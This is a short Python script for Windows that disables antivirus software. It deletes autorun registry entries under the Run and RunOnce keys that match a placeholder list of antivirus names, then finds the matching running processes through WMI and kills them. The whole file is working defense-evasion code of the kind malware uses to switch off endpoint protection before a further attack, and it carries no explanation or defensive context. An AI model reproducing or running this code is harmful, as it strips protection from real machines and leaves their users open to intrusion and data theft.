import winreg, wmi, os, signal

av_list = ["av_name1","av_name2"]

# Remove Reg Key 
reghives = [winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER]
regpaths = ["SOFTWARE\Microsoft\Windows\CurrentVersion\Run","SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"]

for reghive in reghives:
    for regpath in regpaths:
        reg = winreg.ConnectRegistry(None,reghive)
        key = winreg.OpenKey(reg,regpath,0,access=winreg.KEY_READ)
        try:
            index=0
            while True:
                val = winreg.EnumValue(key,index)
                for av in av_list:
                    if av in val[1]:
                        print("Deleting %s Autorun Key" % val[0])
                        key2 = winreg.OpenKey(reg,regpath,0,access=winreg.KEY_SET_VALUE)
                        winreg.DeleteValue(key2,val[0])
                index+=1
        except OSError:
            {}

# Find and kill process
f = wmi.WMI()
for process in f.Win32_Process():
    for av in av_list:
        if av in process.Name:
            os.kill(int(process.ProcessId),signal.SIGTERM)
